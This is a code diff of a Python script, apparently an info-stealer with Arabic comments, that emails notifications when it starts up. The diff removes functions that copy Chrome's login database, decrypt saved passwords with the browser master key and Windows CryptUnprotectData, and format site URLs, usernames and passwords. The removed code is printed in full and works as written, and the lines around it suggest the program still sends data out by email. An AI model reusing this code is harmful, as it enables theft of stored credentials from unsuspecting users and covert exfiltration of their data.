@@ -22,11 +22,6 @@ import socket
 import subprocess
 import shutil
 import sys
-from Crypto.Cipher import AES
-import win32crypt  # تحتاج تثبيت pywin32
-from Cryptodome.Protocol.KDF import PBKDF2
-import base64
-import json
 import sqlite3
 import tempfile
 
@@ -96,47 +91,7 @@ def send_email(subject, content):
 
     except Exception as e:
         print(f"[-] Email error: {e}")
-def decrypt_chrome_password(ciphertext, master_key):
-    try:
-        if ciphertext.startswith(b'v10'):
-            iv = ciphertext[3:15]
-            payload = ciphertext[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted = cipher.decrypt(payload)[:-16]
-            return decrypted.decode()
-        else:
-            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
-    except Exception:
-        return "Failed to decrypt"
 
-def extract_chrome_passwords(login_db_path, local_state_path):
-    master_key = get_chrome_master_key(local_state_path)
-    if not master_key:
-        return "[!] Master key not found."
-
-    temp_copy = os.path.join(tempfile.gettempdir(), "chrome_login_temp.db")
-    shutil.copy2(login_db_path, temp_copy)
-
-    passwords = "\n===== Chrome Saved Passwords =====\n"
-    try:
-        conn = sqlite3.connect(temp_copy)
-        cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for row in cursor.fetchall():
-            url, username, encrypted_password = row
-            if username or encrypted_password:
-                decrypted_password = decrypt_chrome_password(encrypted_password, master_key)
-                passwords += f"[{url}]\nUser: {username}\nPass: {decrypted_password}\n\n"
-        cursor.close()
-        conn.close()
-    except Exception as e:
-        passwords += f"[!] Error reading login DB: {e}\n"
-    finally:
-        try:
-            os.remove(temp_copy)
-        except:
-            pass
-    return passwords
 
 # ===== إرسال إشعار بدء التشغيل =====
 def send_startup_info():
